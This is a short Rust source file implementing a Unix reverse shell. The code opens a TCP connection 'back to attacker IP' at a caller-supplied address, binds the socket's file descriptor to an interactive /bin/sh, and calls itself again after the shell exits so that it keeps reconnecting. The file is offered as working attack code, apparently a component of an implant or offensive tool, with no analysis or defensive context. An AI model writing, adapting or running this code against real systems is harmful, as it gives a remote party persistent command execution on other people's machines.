/// unix shell
use std::net::{TcpStream, SocketAddr};
use std::process::{Command, Stdio};
use std::{thread, time};

extern crate socket2;

use self::socket2::{Socket, Domain, Type};



// Unix bases imports
use std::os::unix::io::{AsRawFd, FromRawFd};

pub fn shell(ip: String, port: String) {
    // ET, Phone Home!
    let home = [ip, port].join(":");

    sh(home)

}

fn sh(home: String){

    // create a TCP listener bound to two addresses
    let socket = Socket::new(Domain::ipv4(), Type::stream(), None).unwrap();

    // Connect back to attacker IP
    socket.connect(&home.parse::<SocketAddr>().unwrap().into());

    let s = socket.into_tcp_stream();

    // Raw FD for unix
    let fd = s.as_raw_fd();

    // Open shell
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();


    // println!("Shell exited");
    sh(home);
}
